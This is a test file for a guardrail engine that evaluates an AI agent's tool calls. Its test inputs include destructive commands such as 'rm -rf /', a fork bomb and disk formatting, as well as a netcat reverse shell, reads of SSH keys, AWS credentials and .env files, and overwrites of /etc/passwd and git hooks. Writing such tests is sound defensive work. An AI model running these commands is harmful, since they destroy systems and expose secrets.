import { describe, it, expect } from 'vitest';
import { PolicyEngine } from '../src/policy/engine.js';
import { DEFAULT_SECURITY_POLICY } from '../src/policy/defaultPolicy.js';

describe('PolicyEngine Guardrails', () => {
  const engine = new PolicyEngine(DEFAULT_SECURITY_POLICY);

  describe('Destructive System Commands', () => {
    it('blocks rm -rf / commands', () => {
      const result = engine.evaluate('execute_command', { command: 'rm -rf /' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
      expect(result.allowed).toBe(false);
      expect(result.reasons[0]).toContain('destructive system command');
    });

    it('blocks fork bombs', () => {
      const result = engine.evaluate('bash', { command: ':(){ :|:& };:' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });

    it('blocks raw disk formatting', () => {
      const result = engine.evaluate('run_terminal_command', { command: 'mkfs.ext4 /dev/sda1' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });

    it('blocks reverse shell execution', () => {
      const result = engine.evaluate('execute_command', { command: 'nc 10.0.0.1 4444 -e /bin/sh' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });
  });

  describe('Credential and Secret Protection', () => {
    it('blocks reading private SSH keys', () => {
      const result = engine.evaluate('read_file', { path: '~/.ssh/id_rsa' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
      expect(result.reasons.some((r) => r.includes('~/.ssh'))).toBe(true);
    });

    it('blocks access to AWS credentials', () => {
      const result = engine.evaluate('view_file', { path: '~/.aws/credentials' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });

    it('blocks reading .env files', () => {
      const result = engine.evaluate('read_file', { path: '/workspace/project/.env.production' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });

    it('blocks printing environment variables to console', () => {
      const result = engine.evaluate('execute_command', { command: 'printenv | grep KEY' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });
  });

  describe('System Directory Protection & Path Traversal', () => {
    it('blocks write operations to /etc/passwd', () => {
      const result = engine.evaluate('write_file', { path: '/etc/passwd', content: 'root::0:0:::' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });

    it('blocks directory traversal attempts towards protected system paths', () => {
      const result = engine.evaluate('edit_file', { path: '../../etc/shadow', content: 'fake' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });

    it('blocks tampering with git hooks', () => {
      const result = engine.evaluate('write_file', { path: '.git/hooks/pre-commit', content: '#!/bin/sh\nmalicious' });
      expect(result.action).toBe('block');
      expect(result.riskLevel).toBe('critical');
    });
  });

  describe('Safe Reads and Sandboxed Execution', () => {
    it('allows benign workspace read operations', () => {
      const result = engine.evaluate('read_file', { path: 'src/index.ts' });
      expect(result.action).toBe('allow');
      expect(result.riskLevel).toBe('low');
      expect(result.allowed).toBe(true);
    });

    it('sandboxes general shell commands', () => {
      const result = engine.evaluate('execute_command', { command: 'ls -la' });
      expect(result.action).toBe('sandbox');
      expect(result.shouldSandbox).toBe(true);
    });

    it('escalates external network fetch for human approval', () => {
      const result = engine.evaluate('http_fetch', { url: 'https://example.com' });
      expect(result.action).toBe('require_approval');
      expect(result.requiresApproval).toBe(true);
    });
  });
});
